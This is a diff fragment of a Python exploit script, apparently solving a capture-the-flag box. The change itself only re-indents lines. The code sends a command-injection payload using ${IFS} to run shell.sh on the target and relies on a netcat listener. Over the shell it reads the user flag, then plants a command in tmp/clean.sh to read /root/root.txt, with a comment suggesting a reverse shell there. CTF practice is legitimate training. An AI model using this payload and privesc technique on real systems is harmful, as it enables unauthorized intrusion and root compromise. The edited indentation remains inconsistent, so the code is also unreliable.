@@ -39,17 +39,17 @@ def executing_payload():
 	print("starting listener..")
 	#chuchu = listen(8888)  #if this doesn't work then comment the listen things.. and start your own listener using nc -lvp 8888
 	command_injection(url,';bash${IFS}shell.sh;')
-  print("Executing the payload..")
+  	print("Executing the payload..")
 	#sleep(2)
-  print("finding the first flag")
+  	print("finding the first flag")
 	chuchu.sendline("cat admin/flag.txt")
 	chuchu.recv()
-  print("Going for the root")
-  print('writing a file to privesc') # you can put reverseshell aslo
+  	print("Going for the root")
+  	print('writing a file to privesc') # you can put reverseshell aslo
 	chuchu.sendline("echo 'cat /root/root.txt > root.txt' > tmp/clean.sh")
 	sleep(120)
-    chuchu.sendline('cat root.txt')
-    chuchu.recv()
+    	chuchu.sendline('cat root.txt')
+   	chuchu.recv()
     
     
 if __name__ == '__main__':
